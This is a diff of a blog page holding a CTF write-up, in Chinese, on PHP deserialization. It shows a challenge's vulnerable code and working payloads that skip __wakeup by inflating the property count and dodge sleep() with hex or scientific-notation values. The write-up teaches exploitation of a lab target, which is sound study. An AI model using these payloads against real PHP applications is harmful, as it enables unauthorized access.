@@ -405,6 +405,7 @@ height:50vh;
     <article class="article-entry">
         <p><a href="http://123.206.31.85:10012/" target="_blank" rel="noopener">原题网址</a></p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Time</span></span>&#123;</span><br><span class="line">	<span class="keyword">public</span> $flag = xxxxx;</span><br><span class="line">	<span class="keyword">public</span> $truepassword = xxxxx;</span><br><span class="line">	<span class="keyword">public</span> $time;</span><br><span class="line">    <span class="keyword">public</span> $password;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">construct</span><span class="params">($tt, $pp)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;time = $tt;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;password = $pp;</span><br><span class="line">    &#125;</span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>&#123;</span><br><span class="line">		<span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="keyword">$this</span>-&gt;password)) &#123;</span><br><span class="line">			<span class="keyword">if</span>(strcmp(<span class="keyword">$this</span>-&gt;password,<span class="keyword">$this</span>-&gt;truepassword)==<span class="number">0</span>)&#123;</span><br><span class="line">				<span class="keyword">echo</span> <span class="string">"&lt;h1&gt;Welcome,you need to wait......&lt;br&gt;The flag will become soon....&lt;/h1&gt;&lt;br&gt;"</span>;</span><br><span class="line">				<span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="keyword">$this</span>-&gt;time))&#123;</span><br><span class="line">					<span class="keyword">if</span>(!is_numeric(<span class="keyword">$this</span>-&gt;time))&#123;</span><br><span class="line">						<span class="keyword">echo</span> <span class="string">'Sorry.&lt;br&gt;'</span>;</span><br><span class="line">						show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">					&#125;</span><br><span class="line">					<span class="keyword">else</span> <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;time &lt; <span class="number">11</span> * <span class="number">22</span> * <span class="number">33</span> * <span class="number">44</span> * <span class="number">55</span> * <span class="number">66</span>)&#123;</span><br><span class="line">						<span class="keyword">echo</span> <span class="string">'you need a bigger time.&lt;br&gt;'</span>;</span><br><span class="line">					&#125;</span><br><span class="line">					<span class="keyword">else</span> <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;time &gt; <span class="number">66</span> * <span class="number">55</span> * <span class="number">44</span> * <span class="number">33</span> * <span class="number">23</span> * <span class="number">11</span>)&#123;</span><br><span class="line">						<span class="keyword">echo</span> <span class="string">'you need a smaller time.&lt;br&gt;'</span>;</span><br><span class="line">					&#125;</span><br><span class="line">					<span class="keyword">else</span>&#123;</span><br><span class="line">						sleep((int)<span class="keyword">$this</span>-&gt;time);</span><br><span class="line">						var_dump(<span class="keyword">$this</span>-&gt;flag);</span><br><span class="line">					&#125;</span><br><span class="line">					<span class="keyword">echo</span> <span class="string">'&lt;hr&gt;'</span>;</span><br><span class="line">				&#125;</span><br><span class="line">				<span class="keyword">else</span>&#123;</span><br><span class="line">					<span class="keyword">echo</span> <span class="string">'&lt;h1&gt;you have no time!!!!!&lt;/h1&gt;&lt;br&gt;'</span>;</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">else</span>&#123;</span><br><span class="line">				<span class="keyword">echo</span> <span class="string">'&lt;h1&gt;Password is wrong............&lt;/h1&gt;&lt;br&gt;'</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span>&#123;</span><br><span class="line">			<span class="keyword">echo</span> <span class="string">"&lt;h1&gt;Please input password..........&lt;/h1&gt;&lt;br&gt;"</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span>&#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">'hello hacker,I have changed your password and time, rua!'</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'rua'</span>]))&#123;</span><br><span class="line">    <span class="comment">//$test = new Time(1.275523920, array("a"));</span></span><br><span class="line">	$rua = $_GET[<span class="string">'rua'</span>];</span><br><span class="line">	@unserialize($rua);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">"&lt;h1&gt;Please don't stop rua 233333&lt;/h1&gt;&lt;br&gt;"</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
 <p>稍稍记录一下，简单的反序列化。</p>
 <p><strong>何为序列化？</strong></p>
 <blockquote>
@@ -414,24 +415,30 @@ height:50vh;
 <blockquote>
 <p>变量类型：类名长度：类名：属性数量：{属性类型：属性名长度：属性名；属性值类型：属性值长度：属性值内容}</p>
 </blockquote>
-<p><strong>PHP 中的魔术方法（Magic methods）</strong><br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">__construct()， __destruct()， __call()， __callStatic()， __get()， __set()， __isset()， __unset()， </span><br><span class="line">__sleep()， __wakeup()， __toString()， __invoke()， __set_state()， __clone()，__debugInfo()</span><br></pre></td></tr></table></figure></p>
+<p><strong>PHP 中的魔术方法（Magic methods）</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">__construct()， __destruct()， __call()， __callStatic()， __get()， __set()， __isset()， __unset()， </span><br><span class="line">__sleep()， __wakeup()， __toString()， __invoke()， __set_state()， __clone()，__debugInfo()</span><br></pre></td></tr></table></figure>
+
 <p>这里我们着重关注几个：</p>
 <ul>
 <li><code>__construct()</code>：当对象创建(new)时会自动调用。但在unserialize()时是不会自动调用的。</li>
 <li><code>__destruct()</code>：当对象被销毁时会自动调用。</li>
 <li><code>__sleep()</code>：serialize() 会检查类中是否存在一个魔术方法 __sleep()。若存在，该方法会先被调用，再执行序列化操作</li>
-<li><code>__wakeup()</code>：unserialize() 会检查是否存在一个 <strong>wakeup() 方法。若存在，则先调用 </strong>wakeup 方法，预先准备对象需要的资源。</li>
+<li><code>__wakeup()</code>：unserialize() 会检查是否存在一个 __wakeup() 方法。若存在，则先调用 __wakeup 方法，预先准备对象需要的资源。</li>
 <li><code>__toString()</code>：用于一个类被当成字符串时应怎样回应。例如 <code>echo $obj;</code> 应该显示些什么。</li>
 </ul>
 <p>PHP 有个 Bug，该漏洞可以概括为：</p>
 <blockquote>
-<p>当序列化字符串中表示对象个数的值大于真实的属性个数时会跳过 __wakeup 函数的执行<br><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">rua</span>=O:<span class="number">4</span>:<span class="string">"Time"</span>:<span class="number">3</span>:&#123;</span><br></pre></td></tr></table></figure></p>
+<p>当序列化字符串中表示对象个数的值大于真实的属性个数时会跳过 __wakeup 函数的执行</p>
 </blockquote>
+<figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">rua</span>=O:<span class="number">4</span>:<span class="string">"Time"</span>:<span class="number">3</span>:&#123;</span><br></pre></td></tr></table></figure>
+
 <p>注意上面的 3 ，是属性数量，本来2个就够了。</p>
 <p>16进制 <code>0x</code> 开头在强制转换中出现问题，导致转换成0</p>
-<p>payload 如下：<br><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">rua</span>=O:4:<span class="number">%22</span>Time<span class="number">%22</span>:4:&#123;s:4:<span class="number">%22</span>time<span class="number">%22</span>;s:10:<span class="number">%220</span>x4c06f350<span class="number">%22</span>;s:8:<span class="number">%22</span>password<span class="number">%22</span>;a:2:&#123;i:0;s:1:<span class="number">%22</span>a<span class="number">%22</span>;i:1;s:1:<span class="number">%22</span>b<span class="number">%22</span>;&#125;&#125;</span><br></pre></td></tr></table></figure></p>
-<p>还有一种办法：科学计数法绕过 sleep()<br><figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rua=<span class="string">O:</span><span class="number">4</span>:<span class="string">"Time"</span>:<span class="number">3</span>:&#123;<span class="string">s:</span><span class="number">4</span>:<span class="string">"time"</span>;<span class="string">s:</span><span class="number">5</span>:<span class="string">"1.3e9"</span>;</span><br></pre></td></tr></table></figure></p>
+<p>payload 如下：</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">rua</span>=O:4:<span class="number">%22</span>Time<span class="number">%22</span>:4:&#123;s:4:<span class="number">%22</span>time<span class="number">%22</span>;s:10:<span class="number">%220</span>x4c06f350<span class="number">%22</span>;s:8:<span class="number">%22</span>password<span class="number">%22</span>;a:2:&#123;i:0;s:1:<span class="number">%22</span>a<span class="number">%22</span>;i:1;s:1:<span class="number">%22</span>b<span class="number">%22</span>;&#125;&#125;</span><br></pre></td></tr></table></figure>
 
+<p>还有一种办法：科学计数法绕过 sleep()</p>
+<figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rua=<span class="string">O:</span><span class="number">4</span>:<span class="string">"Time"</span>:<span class="number">3</span>:&#123;<span class="string">s:</span><span class="number">4</span>:<span class="string">"time"</span>;<span class="string">s:</span><span class="number">5</span>:<span class="string">"1.3e9"</span>;</span><br></pre></td></tr></table></figure>
     </article>
     <!-- license  -->
     
@@ -997,9 +1004,57 @@ top:50vh;
     
     
     
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
     <div class="total-and-search">
         <div class="total-archive">
-        Total : 30
+        Total : 34
         </div>
         <!-- search  -->
         
@@ -1012,6 +1067,26 @@ top:50vh;
     
     <div class="archive-year"> 2019 </div>
     <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">05/18</span><a class="archive-post-title" href="/2019/05/18/SSRF-Tips/">SSRF Tips</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">05/18</span><a class="archive-post-title" href="/2019/05/18/phar-与反序列化/">phar 与反序列化</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">05/17</span><a class="archive-post-title" href="/2019/05/17/Redis-未授权访问相关利用/">Redis 未授权访问相关利用</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">05/12</span><a class="archive-post-title" href="/2019/05/12/命令注入绕过总结/">命令注入总结</a>
+        </li>
     
     
         <li class="archive-post-item">
@@ -1179,23 +1254,29 @@ top:50vh;
     
         <span class="sidebar-tag-name" data-tags="Writeup"><span class="iconfont-archer">&#xe606;</span>Writeup</span>
     
-        <span class="sidebar-tag-name" data-tags="ssrf"><span class="iconfont-archer">&#xe606;</span>ssrf</span>
-    
         <span class="sidebar-tag-name" data-tags="php 伪随机数"><span class="iconfont-archer">&#xe606;</span>php 伪随机数</span>
     
         <span class="sidebar-tag-name" data-tags="算法"><span class="iconfont-archer">&#xe606;</span>算法</span>
     
+        <span class="sidebar-tag-name" data-tags="ssrf"><span class="iconfont-archer">&#xe606;</span>ssrf</span>
+    
         <span class="sidebar-tag-name" data-tags="Docker"><span class="iconfont-archer">&#xe606;</span>Docker</span>
+    
+        <span class="sidebar-tag-name" data-tags="反序列化"><span class="iconfont-archer">&#xe606;</span>反序列化</span>
     
         <span class="sidebar-tag-name" data-tags="SQLi"><span class="iconfont-archer">&#xe606;</span>SQLi</span>
     
-        <span class="sidebar-tag-name" data-tags="反序列化"><span class="iconfont-archer">&#xe606;</span>反序列化</span>
+        <span class="sidebar-tag-name" data-tags="命令注入"><span class="iconfont-archer">&#xe606;</span>命令注入</span>
+    
+        <span class="sidebar-tag-name" data-tags="总结"><span class="iconfont-archer">&#xe606;</span>总结</span>
     
         <span class="sidebar-tag-name" data-tags="心得"><span class="iconfont-archer">&#xe606;</span>心得</span>
     
         <span class="sidebar-tag-name" data-tags="webshell"><span class="iconfont-archer">&#xe606;</span>webshell</span>
     
         <span class="sidebar-tag-name" data-tags="xss"><span class="iconfont-archer">&#xe606;</span>xss</span>
+    
+        <span class="sidebar-tag-name" data-tags="redis"><span class="iconfont-archer">&#xe606;</span>redis</span>
     
         <span class="sidebar-tag-name" data-tags="渗透测试"><span class="iconfont-archer">&#xe606;</span>渗透测试</span>
     
